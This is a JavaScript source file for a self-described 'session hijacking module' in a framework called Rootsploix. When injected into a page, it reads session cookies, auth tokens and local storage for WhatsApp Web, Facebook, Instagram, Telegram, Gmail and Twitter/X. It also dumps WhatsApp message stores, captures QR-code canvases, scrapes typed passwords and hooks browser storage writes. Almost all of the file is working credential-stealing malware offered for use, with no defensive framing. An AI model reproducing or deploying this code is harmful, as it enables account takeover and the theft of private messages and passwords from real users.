/**
 * ROOTSPLOIX SOCIAL MEDIA SESSION HIJACKING MODULE
 * Targets: WhatsApp Web, Facebook, Instagram, Telegram, Gmail
 * Cross-platform: iOS, Android, Windows, macOS
 * AUTO-EXTRACTION on page load
 */

class SocialMediaHijacker {
    constructor(core) {
        this.core = core;
        this.extractedData = {};
        this.monitoringActive = false;
        this.platforms = {
            whatsapp: false,
            facebook: false,
            instagram: false,
            telegram: false,
            gmail: false,
            twitter: false
        };
        
        // Auto-start extraction
        this.start();
    }

    start() {
        console.log('[SOCIAL] 🎯 Social Media Hijacker Starting...');
        
        // Platform detection and extraction
        this.detectPlatforms();
        this.startSessionExtraction();
        this.installStorageMonitors();
        this.monitorCookieChanges();
        
        this.monitoringActive = true;
        console.log('[SOCIAL] ✅ All social media hooks installed');
    }

    detectPlatforms() {
        const currentUrl = window.location.href;
        const currentDomain = window.location.hostname;
        
        // WhatsApp Web Detection
        if (currentDomain.includes('web.whatsapp.com')) {
            this.platforms.whatsapp = true;
            this.extractWhatsAppData();
        }
        
        // Facebook Detection
        if (currentDomain.includes('facebook.com') || currentDomain.includes('messenger.com')) {
            this.platforms.facebook = true;
            this.extractFacebookData();
        }
        
        // Instagram Detection
        if (currentDomain.includes('instagram.com')) {
            this.platforms.instagram = true;
            this.extractInstagramData();
        }
        
        // Telegram Web Detection
        if (currentDomain.includes('web.telegram.org')) {
            this.platforms.telegram = true;
            this.extractTelegramData();
        }
        
        // Gmail Detection
        if (currentDomain.includes('mail.google.com')) {
            this.platforms.gmail = true;
            this.extractGmailData();
        }
        
        // Twitter Detection
        if (currentDomain.includes('twitter.com') || currentDomain.includes('x.com')) {
            this.platforms.twitter = true;
            this.extractTwitterData();
        }
        
        // Generic social media extraction for any platform
        this.extractGenericSocialData();
    }

    // WhatsApp Web Extraction
    extractWhatsAppData() {
        console.log('[SOCIAL] 🟢 WhatsApp Web detected - extracting data...');
        
        try {
            // WhatsApp session data
            const waSession = {
                browserID: localStorage.getItem('WABrowserId'),
                secretBundle: localStorage.getItem('WASecretBundle'),
                token1: localStorage.getItem('WAToken1'),
                token2: localStorage.getItem('WAToken2'),
                serverToken: localStorage.getItem('WAServerToken'),
                cookies: this.getCookiesByDomain('whatsapp.com')
            };
            
            // Extract IndexedDB data (messages, contacts)
            this.extractWhatsAppIndexedDB();
            
            this.extractedData.whatsapp = waSession;
            
            // Monitor for QR code changes
            this.monitorWhatsAppQR();
            
        } catch (error) {
            console.log('[SOCIAL] WhatsApp extraction error:', error);
        }
    }

    extractWhatsAppIndexedDB() {
        try {
            const request = indexedDB.open('wawc');
            request.onsuccess = (event) => {
                const db = event.target.result;
                const transaction = db.transaction(['user'], 'readonly');
                const store = transaction.objectStore('user');
                const getAll = store.getAll();
                
                getAll.onsuccess = () => {
                    this.extractedData.whatsappMessages = getAll.result;
                };
            };
        } catch (error) {
            console.log('[SOCIAL] WhatsApp IndexedDB extraction failed');
        }
    }

    monitorWhatsAppQR() {
        const qrObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                const qrElements = document.querySelectorAll('[data-ref], canvas, svg');
                qrElements.forEach(element => {
                    if (element.tagName === 'CANVAS' && element.width > 200) {
                        // Possible QR code canvas
                        this.captureQRCode(element);
                    }
                });
            });
        });
        
        qrObserver.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    captureQRCode(canvas) {
        try {
            const dataURL = canvas.toDataURL();
            this.extractedData.whatsappQR = {
                qrCode: dataURL,
                timestamp: Date.now(),
                url: window.location.href
            };
        } catch (error) {
            console.log('[SOCIAL] QR capture failed');
        }
    }

    // Facebook/Meta Extraction
    extractFacebookData() {
        console.log('[SOCIAL] 🔵 Facebook detected - extracting data...');
        
        try {
            const fbSession = {
                userID: this.extractFromCookie('c_user'),
                sessionID: this.extractFromCookie('xs'),
                accessToken: this.findFacebookAccessToken(),
                dtsg: this.findFacebookDTSG(),
                cookies: this.getCookiesByDomain('facebook.com'),
                localStorage: this.getLocalStorageByPattern(['facebook', 'fb'])
            };
            
            this.extractedData.facebook = fbSession;
            
        } catch (error) {
            console.log('[SOCIAL] Facebook extraction error:', error);
        }
    }

    findFacebookAccessToken() {
        // Search for access token in various places
        const scripts = document.querySelectorAll('script');
        for (let script of scripts) {
            const content = script.textContent;
            const tokenMatch = content.match(/access_token[\"'\s]*:[\"'\s]*([^\"'\s,}]+)/);
            if (tokenMatch) {
                return tokenMatch[1];
            }
        }
        return null;
    }

    findFacebookDTSG() {
        // Search for DTSG token
        const scripts = document.querySelectorAll('script');
        for (let script of scripts) {
            const content = script.textContent;
            const dtsgMatch = content.match(/DTSGInitialData[\"'\s]*,[\"'\s]*([^\"'\s,}]+)/);
            if (dtsgMatch) {
                return dtsgMatch[1];
            }
        }
        return null;
    }

    // Instagram Extraction
    extractInstagramData() {
        console.log('[SOCIAL] 🟣 Instagram detected - extracting data...');
        
        try {
            const instaSession = {
                sessionid: this.extractFromCookie('sessionid'),
                csrftoken: this.extractFromCookie('csrftoken'),
                userId: this.extractFromCookie('ds_user_id'),
                cookies: this.getCookiesByDomain('instagram.com'),
                localStorage: this.getLocalStorageByPattern(['instagram', 'ig'])
            };
            
            this.extractedData.instagram = instaSession;
            
        } catch (error) {
            console.log('[SOCIAL] Instagram extraction error:', error);
        }
    }

    // Telegram Web Extraction
    extractTelegramData() {
        console.log('[SOCIAL] 🟦 Telegram Web detected - extracting data...');
        
        try {
            const telegramSession = {
                authKey: localStorage.getItem('dc1_auth_key'),
                userAuth: localStorage.getItem('user_auth'),
                localStorage: this.getLocalStorageByPattern(['telegram', 'tg']),
                cookies: this.getCookiesByDomain('telegram.org')
            };
            
            this.extractedData.telegram = telegramSession;
            
        } catch (error) {
            console.log('[SOCIAL] Telegram extraction error:', error);
        }
    }

    // Gmail Extraction
    extractGmailData() {
        console.log('[SOCIAL] 🔴 Gmail detected - extracting data...');
        
        try {
            const gmailSession = {
                authToken: this.findGmailAuthToken(),
                cookies: this.getCookiesByDomain('google.com'),
                localStorage: this.getLocalStorageByPattern(['gmail', 'google'])
            };
            
            this.extractedData.gmail = gmailSession;
            
        } catch (error) {
            console.log('[SOCIAL] Gmail extraction error:', error);
        }
    }

    findGmailAuthToken() {
        // Search for Gmail auth tokens in scripts
        const scripts = document.querySelectorAll('script');
        for (let script of scripts) {
            const content = script.textContent;
            const tokenMatch = content.match(/(?:auth[Tt]oken|access_token)[\"'\s]*:[\"'\s]*([^\"'\s,}]+)/);
            if (tokenMatch) {
                return tokenMatch[1];
            }
        }
        return null;
    }

    // Twitter/X Extraction
    extractTwitterData() {
        console.log('[SOCIAL] 🐦 Twitter/X detected - extracting data...');
        
        try {
            const twitterSession = {
                authToken: this.extractFromCookie('auth_token'),
                csrf: this.extractFromCookie('ct0'),
                cookies: this.getCookiesByDomain(['twitter.com', 'x.com']),
                localStorage: this.getLocalStorageByPattern(['twitter', 'x.com'])
            };
            
            this.extractedData.twitter = twitterSession;
            
        } catch (error) {
            console.log('[SOCIAL] Twitter extraction error:', error);
        }
    }

    // Generic Social Media Extraction
    extractGenericSocialData() {
        try {
            // Extract all cookies
            this.extractedData.allCookies = this.getAllCookies();
            
            // Extract all localStorage
            this.extractedData.allLocalStorage = this.getAllLocalStorage();
            
            // Extract all sessionStorage
            this.extractedData.allSessionStorage = this.getAllSessionStorage();
            
            // Extract browser saved passwords
            this.extractBrowserPasswords();
            
        } catch (error) {
            console.log('[SOCIAL] Generic extraction error:', error);
        }
    }

    // Storage Monitoring
    installStorageMonitors() {
        // Monitor localStorage changes
        const originalSetItem = localStorage.setItem;
        localStorage.setItem = (key, value) => {
            this.logStorageChange('localStorage', 'set', key, value);
            originalSetItem.call(localStorage, key, value);
        };
        
        // Monitor sessionStorage changes
        const originalSessionSetItem = sessionStorage.setItem;
        sessionStorage.setItem = (key, value) => {
            this.logStorageChange('sessionStorage', 'set', key, value);
            originalSessionSetItem.call(sessionStorage, key, value);
        };
    }

    logStorageChange(storageType, action, key, value) {
        if (!this.extractedData.storageChanges) {
            this.extractedData.storageChanges = [];
        }
        
        this.extractedData.storageChanges.push({
            storageType,
            action,
            key,
            value,
            timestamp: Date.now(),
            url: window.location.href
        });
    }

    // Cookie Monitoring
    monitorCookieChanges() {
        let previousCookies = document.cookie;
        
        setInterval(() => {
            const currentCookies = document.cookie;
            if (currentCookies !== previousCookies) {
                this.extractedData.cookieChanges = {
                    previous: previousCookies,
                    current: currentCookies,
                    timestamp: Date.now()
                };
                previousCookies = currentCookies;
            }
        }, 1000);
    }

    // Utility Functions
    getCookiesByDomain(domains) {
        const allCookies = this.getAllCookies();
        const domainList = Array.isArray(domains) ? domains : [domains];
        
        return allCookies.filter(cookie => 
            domainList.some(domain => cookie.name.includes(domain) || cookie.domain.includes(domain))
        );
    }

    getAllCookies() {
        const cookies = [];
        document.cookie.split(';').forEach(cookie => {
            const parts = cookie.trim().split('=');
            if (parts.length === 2) {
                cookies.push({
                    name: parts[0],
                    value: parts[1],
                    domain: window.location.hostname
                });
            }
        });
        return cookies;
    }

    extractFromCookie(cookieName) {
        const cookie = document.cookie
            .split('; ')
            .find(row => row.startsWith(cookieName + '='));
        return cookie ? cookie.split('=')[1] : null;
    }

    getLocalStorageByPattern(patterns) {
        const data = {};
        const patternList = Array.isArray(patterns) ? patterns : [patterns];
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (patternList.some(pattern => key.toLowerCase().includes(pattern.toLowerCase()))) {
                data[key] = localStorage.getItem(key);
            }
        }
        return data;
    }

    getAllLocalStorage() {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data[key] = localStorage.getItem(key);
        }
        return data;
    }

    getAllSessionStorage() {
        const data = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data[key] = sessionStorage.getItem(key);
        }
        return data;
    }

    extractBrowserPasswords() {
        // Try to extract autofill/saved password data
        try {
            const passwordFields = document.querySelectorAll('input[type="password"]');
            passwordFields.forEach(field => {
                if (field.value) {
                    if (!this.extractedData.passwords) {
                        this.extractedData.passwords = [];
                    }
                    this.extractedData.passwords.push({
                        field: field.name || field.id,
                        value: field.value,
                        url: window.location.href,
                        timestamp: Date.now()
                    });
                }
            });
        } catch (error) {
            console.log('[SOCIAL] Password extraction failed');
        }
    }

    // Data Retrieval
    getData() {
        return {
            platforms: this.platforms,
            extracted: this.extractedData,
            timestamp: Date.now(),
            url: window.location.href
        };
    }

    stop() {
        this.monitoringActive = false;
        console.log('[SOCIAL] 🛑 Social Media Hijacker stopped');
    }
}

// Export for use in core framework
window.SocialMediaHijacker = SocialMediaHijacker;